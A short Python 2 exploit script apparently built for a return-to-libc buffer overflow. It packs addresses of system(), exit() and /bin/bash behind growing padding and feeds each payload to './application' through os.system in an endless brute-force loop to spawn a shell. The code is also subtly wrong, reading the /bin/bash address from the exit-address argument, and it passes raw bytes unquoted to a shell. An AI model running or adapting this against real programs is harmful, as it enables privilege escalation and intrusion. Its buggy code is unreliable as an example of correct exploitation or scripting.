#!/usr/bin/python

import os
import sys
import struct
import socket

if len(sys.argv) != 4 :
    print "Usage: $" + sys.argv[0] + " <address_of_system> <address_of_exit> <address_of_/bin/bash> "
    sys.exit(1);


location_of_system = struct.pack('<L' , int((sys.argv[1]) , 16))
location_of_exit = struct.pack('<L' , int(str(sys.argv[2]) , 16))
location_of_bash_shell = struct.pack('<L' , int(str(sys.argv[2]) , 16))

print location_of_system
print location_of_exit
print location_of_bash_shell

a_crap_length = 40

while True :

    a_crap = "a" * a_crap_length
    inputstring = a_crap + location_of_system + location_of_exit + location_of_bash_shell

#print "imput string= " + inputstring

    command = "./application " + inputstring
    os.system(command);
    a_crap_length = a_crap_length + 1
